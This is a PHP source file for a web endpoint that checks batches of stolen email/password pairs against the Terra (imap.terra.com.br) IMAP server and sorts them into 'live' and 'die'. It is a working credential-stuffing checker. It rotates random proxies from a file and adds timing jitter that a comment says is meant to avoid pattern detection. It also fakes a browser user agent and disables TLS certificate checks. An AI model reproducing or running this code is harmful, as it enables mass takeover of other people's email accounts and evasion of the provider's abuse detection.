<?php

class TerraValidator
{
    private array $config;
    private array $proxies = [];

    public function __construct()
    {
        $this->config = [
            'imap_server' => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'   => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'     => (int)(getenv('IMAP_TIMEOUT') ?: 10),
            'max_retries' => (int)(getenv('MAX_RETRIES') ?: 2),
            'proxy_file'  => 'proxies.txt'
        ];
        
        $this->loadProxies();
    }

    private function loadProxies(): void
    {
        if (file_exists($this->config['proxy_file'])) {
            $lines = file($this->config['proxy_file'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                $proxy = trim($line);
                if (!empty($proxy)) {
                    $this->proxies[] = $proxy;
                }
            }
        }
    }

    private function getRandomProxy(): ?string
    {
        return !empty($this->proxies) ? $this->proxies[array_rand($this->proxies)] : null;
    }

    /**
     * Valida usando cURL IMAP com suporte real a Proxy SOCKS/HTTP
     */
    public function validate(string $email, string $password): array
    {
        $attempt = 0;
        $start_time = microtime(true);
        $last_error = '';

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            $proxy = $this->getRandomProxy();

            // Jitter para evitar detecção de padrão
            if ($attempt > 1) {
                usleep(rand(500000, 1500000));
            }

            try {
                $result = $this->attemptCurlAuthentication($email, $password, $proxy);
                
                if ($result['status'] === 'live') {
                    $elapsed = round((microtime(true) - $start_time) * 1000, 2);
                    $result['elapsed_ms'] = $elapsed;
                    $result['attempts'] = $attempt;
                    return $result;
                }

                $last_error = $result['message'];

                // Se for erro de autenticação explícito, pare.
                if ($result['reason'] === 'invalid_credentials') {
                    return [
                        'status' => 'die',
                        'email' => $email,
                        'reason' => 'invalid_credentials',
                        'message' => 'Invalid credentials',
                        'elapsed_ms' => round((microtime(true) - $start_time) * 1000, 2),
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                }

                // Se for erro de conexão/proxy, tenta novamente com outro proxy se disponível
            } catch (Exception $e) {
                $last_error = $e->getMessage();
            }
        }

        $elapsed = round((microtime(true) - $start_time) * 1000, 2);
        return [
            'status' => 'die',
            'email' => $email,
            'attempts' => $attempt,
            'last_error' => $last_error ?: 'Max retries exceeded',
            'reason' => 'max_retries_exceeded',
            'elapsed_ms' => $elapsed,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Autenticação via cURL IMAP com suporte a Proxy
     */
    private function attemptCurlAuthentication(string $email, string $password, ?string $proxy): array
    {
        $url = sprintf(
            "imaps://%s:%d/INBOX", 
            $this->config['imap_server'], 
            $this->config['imap_port']
        );

        $ch = curl_init();
        
        // Configurações básicas
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $this->config['timeout']);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        
        // Autenticação
        curl_setopt($ch, CURLOPT_USERNAME, $email);
        curl_setopt($ch, CURLOPT_PASSWORD, $password);
        
        // SSL/TLS
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Ignora cert inválido (comum em Terra)
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USE_SSL, CURLUSESSL_ALL);

        // Proxy Configuration
        if ($proxy) {
            // Detecta tipo de proxy (socks5:// ou http://)
            if (strpos($proxy, 'socks5') !== false || strpos($proxy, 'socks4') !== false) {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            } else {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            }
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
            // Se o proxy tiver auth, adicione aqui: CURLOPT_PROXYUSERPWD
        }

        // Header para simular cliente legítimo
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        $curlErrno = curl_errno($ch);
        
        curl_close($ch);

        // Análise de Resultado
        // cURL IMAP retorna HTTP 200 se sucesso, 401/403 se falha de auth, 0 se erro de rede
        if ($curlErrno === 0 && $httpCode === 200) {
            return [
                'status' => 'live',
                'email' => $email,
                'message' => 'Autenticação bem-sucedida via cURL',
                'proxy_used' => $proxy ?? 'direct',
                'authenticated_at' => date('Y-m-d H:i:s')
            ];
        }

        // Verifica se é erro de autenticação (401 Unauthorized)
        if ($httpCode === 401 || $httpCode === 403) {
            return [
                'status' => 'die',
                'email' => $email,
                'message' => 'Invalid credentials',
                'reason' => 'invalid_credentials',
                'proxy_used' => $proxy ?? 'direct'
            ];
        }

        // Erro de conexão/timeout/proxy
        $errorMsg = $curlError ?: "HTTP Code: $httpCode";
        return [
            'status' => 'die',
            'email' => $email,
            'message' => 'Connection error: ' . $errorMsg,
            'reason' => 'connection_error',
            'retryable' => true,
            'proxy_used' => $proxy ?? 'direct'
        ];
    }

    public function validateBatch(array $credentials): array
    {
        $results = [];
        foreach ($credentials as $cred) {
            $email = $cred['email'] ?? '';
            $password = $cred['password'] ?? '';

            if (empty($email) || empty($password)) {
                $results[] = ['email' => $email, 'status' => 'error', 'message' => 'Missing creds'];
                continue;
            }
            $results[] = $this->validate($email, $password);
        }

        return [
            'total' => count($results),
            'live' => count(array_filter($results, fn($r) => $r['status'] === 'live')),
            'die' => count(array_filter($results, fn($r) => $r['status'] === 'die')),
            'results' => $results,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }
}

// Execução
header('Content-Type: application/json; charset=utf-8');
$input = $_POST;
if (empty($input) && isset($_SERVER['CONTENT_TYPE']) && str_contains($_SERVER['CONTENT_TYPE'], 'application/json')) {
    $input = json_decode(file_get_contents('php://input'), true) ?? [];
}

$email = $input['email'] ?? '';
$password = $input['password'] ?? '';
$batch = $input['batch'] ?? null;

try {
    $validator = new TerraValidator();
    if ($batch && is_array($batch)) {
        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } elseif (!empty($email) && !empty($password)) {
        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } else {
        http_response_code(400);
        echo json_encode(['error' => 'Credenciais ausentes']);
    }
} catch (Throwable $e) {
    http_response_code(500);
    echo json_encode(['error' => $e->getMessage()]);
}
